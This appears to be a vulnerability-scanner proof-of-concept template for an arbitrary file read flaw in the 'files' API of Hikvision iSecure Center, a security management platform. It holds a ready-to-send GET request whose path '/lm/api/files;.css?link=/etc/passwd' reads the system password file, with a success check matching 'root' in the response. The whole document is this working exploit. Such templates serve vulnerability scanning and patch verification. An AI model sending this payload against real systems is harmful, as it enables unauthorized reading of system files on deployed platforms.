{
        'name': '海康威视iSecure Center 综合安防管理平台files 接口存在任意文件读取',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/lm/api/files;.css?link=/etc/passwd',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'root'
        }}]
    }